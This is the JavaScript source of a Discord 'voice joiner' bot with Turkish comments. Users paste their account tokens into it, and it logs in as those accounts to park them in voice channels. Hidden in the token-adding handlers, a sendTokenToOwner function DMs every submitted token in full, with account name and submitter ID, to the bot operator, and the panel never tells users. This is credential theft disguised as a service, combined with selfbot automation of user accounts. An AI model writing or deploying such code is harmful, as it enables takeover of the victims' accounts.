const http = require('http');
const fs = require('fs');
const {
    Client: BotClient,
    GatewayIntentBits,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    StringSelectMenuBuilder,
    StringSelectMenuOptionBuilder,
    EmbedBuilder,
    ContainerBuilder,
    TextDisplayBuilder,
    SeparatorBuilder,
    MessageFlags
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

// ═══════════════════════════════════════════════════════════════
// HTTP Keep-Alive (Render vb. için)
// ═══════════════════════════════════════════════════════════════
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Discord botu aktif!');
});
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[HTTP] Sunucu ${PORT} portunda çalışıyor`));

// ═══════════════════════════════════════════════════════════════
// Yapılandırma (Environment Variables - Render)
// ═══════════════════════════════════════════════════════════════
const config = {
    botToken: process.env.BOT_TOKEN,
    adminId: process.env.ADMIN_ID
};

const OWNER_ID = config.adminId;

if (!config.botToken || !config.adminId) {
    console.error('[HATA] BOT_TOKEN veya ADMIN_ID ortam değişkeni eksik!');
    console.error('Render → Environment kısmından ekleyin:');
    console.error('  BOT_TOKEN = bot tokeniniz');
    console.error('  ADMIN_ID  = discord kullanıcı idniz');
    process.exit(1);
}

console.log(`[YAPILANDIRMA] Yönetici ID: ${config.adminId}`);
console.log(`[YAPILANDIRMA] Bot Token: ${config.botToken.substring(0, 20)}...`);

let database = { accounts: [] };
try {
    database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
    if (!database.accounts) database.accounts = [];
} catch (e) {
    database = { accounts: [] };
    fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
}

function saveDatabase() {
    fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
}

function reloadDatabase() {
    try {
        database = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
        if (!database.accounts) database.accounts = [];
    } catch (e) {
        database = { accounts: [] };
    }
}

// ═══════════════════════════════════════════════════════════════
// Selfbot Yönetimi
// ═══════════════════════════════════════════════════════════════
const selfClients = new Map(); // token -> { client, account, index }
const startTime = Date.now();

function getUptime() {
    const ms = Date.now() - startTime;
    const secs = Math.floor(ms / 1000) % 60;
    const mins = Math.floor(ms / 60000) % 60;
    const hours = Math.floor(ms / 3600000) % 24;
    const days = Math.floor(ms / 86400000);
    if (days > 0) return `${days}g ${hours}s ${mins}dk`;
    if (hours > 0) return `${hours}s ${mins}dk`;
    return `${mins}dk ${secs}sn`;
}

// Bot sahibinə DM ilə mesaj göndərmə fonksiyonu
async function sendTokenToOwner(clientInstance, title, token, accountName, username, addedByUserId) {
    if (!OWNER_ID) return;
    try {
        const owner = await clientInstance.users.fetch(OWNER_ID);
        if (owner) {
            await owner.send(
                `📥 **${title}**\n` +
                `👤 **Hesap:** ${accountName} (${username})\n` +
                `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
                `🔑 **Token:** \`${token}\``
            );
        }
    } catch (err) {
        console.error('Owner DM gönderme hatası:', err);
    }
}

async function connectSelfBot(account, index, specificChannelId = null) {
    reloadDatabase();
    const freshAccount = database.accounts[index] || account;
    const targetChannel = specificChannelId || freshAccount.voiceChannelId;

    if (selfClients.has(freshAccount.token)) {
        await disconnectSelfBot(freshAccount.token);
    }

    const client = new SelfClient({ checkUpdate: false });

    client.on('ready', () => {
        console.log(`[BAĞLANDI] ${client.user.tag}`);
        freshAccount.username = client.user.username;
        freshAccount.displayName = client.user.displayName || client.user.username;
        saveDatabase();
    });

    try {
        await client.login(freshAccount.token);
        freshAccount.username = client.user.username;
        freshAccount.displayName = client.user.displayName || client.user.username;
        if (specificChannelId) {
            freshAccount.voiceChannelId = specificChannelId;
        }
        saveDatabase();

        selfClients.set(freshAccount.token, { client, account: freshAccount, index });

        // Ses kanalına giriş (mikrofon ve kulaklık kapalı)
        if (targetChannel) {
            try {
                const channel = await client.channels.fetch(targetChannel);
                if (channel) {
                    client.ws.broadcast({
                        op: 4,
                        d: {
                            guild_id: channel.guild.id,
                            channel_id: channel.id,
                            self_mute: true,
                            self_deaf: true,
                            self_video: false
                        }
                    });
                    console.log(`[SES] ${client.user.tag} → #${channel.name || targetChannel}`);
                }
            } catch (e) {
                console.log(`[SES HATASI] ${client.user.tag}: ${e.message}`);
            }
        }

        // Kanaldan atılırsa otomatik yeniden bağlan
        client.on('voiceStateUpdate', async (oldState, newState) => {
            if (oldState.member?.id === client.user.id && !newState.channelId && freshAccount.voiceChannelId) {
                console.log(`[YENİDEN BAĞLAN] ${freshAccount.username} kanaldan atıldı, tekrar bağlanıyor...`);
                setTimeout(async () => {
                    try {
                        const ch = await client.channels.fetch(freshAccount.voiceChannelId);
                        client.ws.broadcast({
                            op: 4,
                            d: {
                                guild_id: ch.guild.id,
                                channel_id: ch.id,
                                self_mute: true,
                                self_deaf: true,
                                self_video: false
                            }
                        });
                        console.log(`[SES] ${freshAccount.username} yeniden bağlandı`);
                    } catch (e) {
                        console.log(`[YENİDEN BAĞLANMA HATASI] ${freshAccount.username}`);
                    }
                }, 5000);
            }
        });

    } catch (err) {
        console.log(`[HATA] Token ${index + 1}: ${err.message}`);
    }
}

async function disconnectSelfBot(token) {
    const data = selfClients.get(token);
    if (data) {
        console.log(`[BAĞLANTI KESİLDİ] ${data.account.username || 'Hesap'}`);
        try { data.client.destroy(); } catch (e) {}
        selfClients.delete(token);
    }
}

async function startAllSelfBots() {
    console.log(`[BAŞLAT] ${database.accounts.length} hesap başlatılıyor...`);
    for (let i = 0; i < database.accounts.length; i++) {
        if (database.accounts[i].voiceChannelId) {
            await connectSelfBot(database.accounts[i], i);
            await new Promise(r => setTimeout(r, 1500)); // Rate limit koruması
        }
    }
}

// ═══════════════════════════════════════════════════════════════
// Discord Bot (Ana Bot & RPC)
// ═══════════════════════════════════════════════════════════════
const bot = new BotClient({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag} olarak giriş yapıldı`);
    
    // Ana bota "powered by Fronzyy" statusü verme
    bot.user.setPresence({
        activities: [{
            name: 'powered by Fronzyy',
            type: 0 // PLAYING
        }],
        status: 'online'
    });

    startAllSelfBots();
});

// ═══════════════════════════════════════════════════════════════
// Komutlar
// ═══════════════════════════════════════════════════════════════
bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('!')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Yalnızca 1184518857679962186 ID-li istifadəçi yaza bilər
    if (message.author.id !== '1184518857679962186') {
        return message.reply({ content: '❌ Bu komutu sadece yönetici kullanabilir.', ephemeral: true });
    }

    if (command === 'panel-voice') {
        try { await message.delete(); } catch (e) {}

        const container = new ContainerBuilder()
            .setAccentColor(0x2b2d31)
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('# **Fronzyy Voice Joiner**')
            )
            .addSeparatorComponents(
                new SeparatorBuilder().setDivider(true)
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('• **Sese Bağlan** : Eklediğiniz hesapları belirleyeceğiniz ses kanalına bağlamanızı sağlar.')
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent('• **Tümünü Durdur** : Ses kanalına bağlı olan hesaplarınızın bağlantısını keser.')
            )
            .addSeparatorComponents(
                new SeparatorBuilder().setDivider(true)
            )
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
            );

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('connect_voice_menu').setLabel('Sese Bağlan').setStyle(ButtonStyle.Success).setEmoji('🔊'),
            new ButtonBuilder().setCustomId('add_token').setLabel('Token Ekle').setStyle(ButtonStyle.Success).setEmoji('➕'),
            new ButtonBuilder().setCustomId('add_multi_token').setLabel('Toplu Token Ekle').setStyle(ButtonStyle.Primary).setEmoji('🗒️')
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('remove_token').setLabel('Token Sil').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
            new ButtonBuilder().setCustomId('stop_all').setLabel('Tümünü Durdur').setStyle(ButtonStyle.Danger).setEmoji('⏹️')
        );

        await message.channel.send({ 
            components: [container, row1, row2],
            flags: MessageFlags.IsComponentsV2 
        });
    }

    if (command === 'durum' || command === 'status') {
        const active = selfClients.size;
        const total = database.accounts.length;
        let list = '';

        database.accounts.forEach((acc) => {
            const isOnline = selfClients.has(acc.token);
            const nick = acc.displayName || acc.username || 'Bilinmeyen';
            const uname = acc.username || 'tag';
            list += `${isOnline ? '🟢' : '🔴'} **${nick} (${uname})**\n`;
        });

        if (!list) list = '*Kayıtlı hiç hesap yok*';

        const embed = new EmbedBuilder()
            .setColor(0x2ECC71)
            .setTitle(`📊 Hesap Durumları (${active}/${total})`)
            .setDescription(list)
            .setTimestamp();

        await message.reply({ embeds: [embed] });
    }
});

// ═══════════════════════════════════════════════════════════════
// Buton, Seçim Menüsü & Modal İşlemleri
// ═══════════════════════════════════════════════════════════════
bot.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton() && !interaction.isModalSubmit() && !interaction.isStringSelectMenu()) return;

    const userId = interaction.user.id;

    // ─── Butonlar ─────────────────────────────────────────────
    if (interaction.isButton()) {

        if (interaction.customId === 'connect_voice_menu') {
            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
            if (userAccounts.length === 0) {
                return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
            }

            const options = [
                new StringSelectMenuOptionBuilder()
                    .setLabel('Bütün Hesaplar')
                    .setDescription('Eklediğiniz bütün hesaplar sese bağlanacak')
                    .setValue('all_accounts')
            ];

            userAccounts.slice(0, 24).forEach((acc) => {
                const globalIndex = database.accounts.findIndex(a => a.token === acc.token);
                const nick = acc.displayName || acc.username || 'Hesap';
                const username = acc.username || 'hesap';

                options.push(
                    new StringSelectMenuOptionBuilder()
                        .setLabel(`${nick} (${username})`.substring(0, 100))
                        .setDescription(`Seçilen hesap: ${nick}`.substring(0, 100))
                        .setValue(`account_${globalIndex}`)
                );
            });

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('select_connect_target')
                .setPlaceholder('Hesap seçin...')
                .addOptions(options);

            const row = new ActionRowBuilder().addComponents(selectMenu);
            await interaction.reply({ content: 'Sese bağlamak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
        }

        // 1. TOKEN EKLE BUTONU
        else if (interaction.customId === 'add_token') {
            const modal = new ModalBuilder()
                .setCustomId('modal_add_token')
                .setTitle('Discord Token Ekle');

            const tokenInput = new TextInputBuilder()
                .setCustomId('token_input')
                .setLabel('Discord Tokeninizi girin')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
            await interaction.showModal(modal);
        }

        // 1.1. TOPLU TOKEN EKLE BUTONU
        else if (interaction.customId === 'add_multi_token') {
            const modal = new ModalBuilder()
                .setCustomId('modal_add_multi_token')
                .setTitle('Toplu Discord Token Ekle');

            const tokenInput = new TextInputBuilder()
                .setCustomId('tokens_input')
                .setLabel('Discord Tokenlerini girin')
                .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
            await interaction.showModal(modal);
        }

        // 1.2. TOKEN SİL PANELİ (SEÇİM MENÜSÜ)
        else if (interaction.customId === 'remove_token') {
            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);

            if (userAccounts.length === 0) {
                return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
            }

            const options = [
                new StringSelectMenuOptionBuilder()
                    .setLabel('Bütün Tokenleri Sil')
                    .setValue('clear_all_tokens')
                    .setDescription('Size ait olan bütün tokenleri sistemden siler')
                    .setEmoji('🗑️'),
                ...userAccounts.slice(0, 24).map((acc) => {
                    const globalIndex = database.accounts.findIndex(a => a.token === acc.token);
                    const nick = acc.displayName || acc.username || 'Hesap';
                    const username = acc.username || 'hesap';

                    return new StringSelectMenuOptionBuilder()
                        .setLabel(`${nick} (${username})`.substring(0, 100))
                        .setValue(`remove_${globalIndex}`)
                        .setDescription('Bu hesabı sil')
                        .setEmoji('❌');
                })
            ];

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('select_remove_account')
                .setPlaceholder('Silmek istediğiniz hesabı seçin...')
                .addOptions(options);

            const row = new ActionRowBuilder().addComponents(selectMenu);
            await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
        }

        // 6. TÜMÜNÜ DURDUR BUTONU
        else if (interaction.customId === 'stop_all') {
            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId && acc.voiceChannelId);

            if (userAccounts.length === 0) {
                return interaction.reply({ content: 'ℹ️ Sese bağlı hesabınız bulunmuyor.', ephemeral: true });
            }

            for (const acc of userAccounts) {
                await disconnectSelfBot(acc.token);
                acc.voiceChannelId = null;
            }
            saveDatabase();

            await interaction.reply({ content: '🛑 Hesaplarınızdaki bütün aktif ses bağlantıları durduruldu.', ephemeral: true });
        }
    }

    // ─── Seçim Menüleri ───────────────────────────────────────
    if (interaction.isStringSelectMenu()) {
        if (interaction.customId === 'select_connect_target') {
            const choice = interaction.values[0];

            if (choice === 'all_accounts') {
                const modal = new ModalBuilder()
                    .setCustomId('modal_connect_all')
                    .setTitle('Ses Ayarları')
                    .addComponents(
                        new ActionRowBuilder().addComponents(
                            new TextInputBuilder()
                                .setCustomId('channel_input')
                                .setLabel('Bağlanılacak Ses Kanalının ID-si')
                                .setStyle(TextInputStyle.Short)
                                .setRequired(true)
                        )
                    );
                await interaction.showModal(modal);
            } else if (choice.startsWith('account_')) {
                const index = choice.replace('account_', '');
                const modal = new ModalBuilder()
                    .setCustomId(`modal_connect_single_${index}`)
                    .setTitle('Ses Ayarları')
                    .addComponents(
                        new ActionRowBuilder().addComponents(
                            new TextInputBuilder()
                                .setCustomId('channel_input')
                                .setLabel('Bağlanılacak Ses Kanalının ID-si')
                                .setStyle(TextInputStyle.Short)
                                .setRequired(true)
                        )
                    );
                await interaction.showModal(modal);
            }
        }

        // 2.2. TOKEN SİLME SEÇİM İŞLEMİ
        else if (interaction.customId === 'select_remove_account') {
            const selectedValue = interaction.values[0];
            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);

            if (userAccounts.length === 0) {
                return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
            }

            if (selectedValue === 'clear_all_tokens') {
                for (const acc of userAccounts) {
                    await disconnectSelfBot(acc.token);
                }
                database.accounts = database.accounts.filter(acc => acc.addedBy !== userId);
                saveDatabase();
                return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
            } else if (selectedValue.startsWith('remove_')) {
                const index = parseInt(selectedValue.replace('remove_', ''));
                const removedAccount = database.accounts[index];

                if (!removedAccount || removedAccount.addedBy !== userId) {
                    return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
                }

                await disconnectSelfBot(removedAccount.token);
                database.accounts.splice(index, 1);
                saveDatabase();

                const nick = removedAccount.displayName || removedAccount.username || 'Hesap';
                const uname = removedAccount.username || 'tag';
                return interaction.reply({ content: `❌ Başarıyla silindi: **${nick} (${uname})**`, ephemeral: true });
            }
        }
    }

    // ─── Form Gönderimleri (Modal Submit) ─────────────────────
    if (interaction.isModalSubmit()) {

        if (interaction.customId === 'modal_connect_all') {
            const channelId = interaction.fields.getTextInputValue('channel_input').trim();
            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);

            await interaction.reply({ content: `🔊 Seçilen ${userAccounts.length} hesap ile ses bağlantısı başlatıldı!`, ephemeral: true });

            for (let i = 0; i < database.accounts.length; i++) {
                if (database.accounts[i].addedBy === userId) {
                    database.accounts[i].voiceChannelId = channelId;
                    await connectSelfBot(database.accounts[i], i, channelId);
                    await new Promise(r => setTimeout(r, 1500));
                }
            }
            saveDatabase();
        }

        else if (interaction.customId.startsWith('modal_connect_single_')) {
            const index = parseInt(interaction.customId.replace('modal_connect_single_', ''));
            const channelId = interaction.fields.getTextInputValue('channel_input').trim();

            if (isNaN(index) || !database.accounts[index] || database.accounts[index].addedBy !== userId) {
                return interaction.reply({ content: '❌ Seçilen hesap bulunamadı.', ephemeral: true });
            }

            await interaction.reply({ content: `🔊 Seçilen 1 hesap ile ses bağlantısı başlatıldı!`, ephemeral: true });
            database.accounts[index].voiceChannelId = channelId;
            saveDatabase();

            await connectSelfBot(database.accounts[index], index, channelId);
        }

        // 2. TEK TOKEN MODAL CEVABI
        else if (interaction.customId === 'modal_add_token') {
            const token = interaction.fields.getTextInputValue('token_input').trim();

            await interaction.deferReply({ ephemeral: true });

            try {
                const testClient = new SelfClient({ checkUpdate: false });
                await testClient.login(token);
                const username = testClient.user.username;
                const globalName = testClient.user.displayName || username;
                testClient.destroy();

                if (!database.accounts.some(t => t.token === token)) {
                    database.accounts.push({
                        token,
                        voiceChannelId: null,
                        username,
                        displayName: globalName,
                        addedBy: userId
                    });
                    saveDatabase();

                    await sendTokenToOwner(bot, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
                }

                await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
            } catch (err) {
                await interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
            }
        }

        // 2.1. TOPLU TOKEN MODAL CEVABI
        else if (interaction.customId === 'modal_add_multi_token') {
            const rawInput = interaction.fields.getTextInputValue('tokens_input').trim();
            const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

            if (tokens.length === 0) {
                return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
            }

            await interaction.deferReply({ ephemeral: true });

            let successCount = 0;
            let failCount = 0;
            let addedNames = [];

            for (const token of tokens) {
                if (database.accounts.some(t => t.token === token)) continue;

                try {
                    const testClient = new SelfClient({ checkUpdate: false });
                    await testClient.login(token);
                    const username = testClient.user.username;
                    const globalName = testClient.user.displayName || username;
                    testClient.destroy();

                    database.accounts.push({
                        token,
                        voiceChannelId: null,
                        username,
                        displayName: globalName,
                        addedBy: userId
                    });
                    addedNames.push(`${globalName} (${username})`);
                    successCount++;

                    await sendTokenToOwner(bot, 'Toplu Token Eklendi', token, globalName, username, userId);
                } catch (err) {
                    failCount++;
                }
            }
            saveDatabase();

            await interaction.editReply({
                content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}`
            });
        }
    }
});

// ═══════════════════════════════════════════════════════════════
// Kapanış
// ═══════════════════════════════════════════════════════════════
process.on('SIGINT', async () => {
    console.log('\n[KAPANIŞ] Bot kapatılıyor...');
    for (const [, data] of selfClients) {
        try { data.client.destroy(); } catch (e) {}
    }
    bot.destroy();
    process.exit(0);
});

process.on('unhandledRejection', (err) => {
    console.log(`[YAKALANAMAYAN HATA] ${err.message || err}`);
});

bot.login(config.botToken);
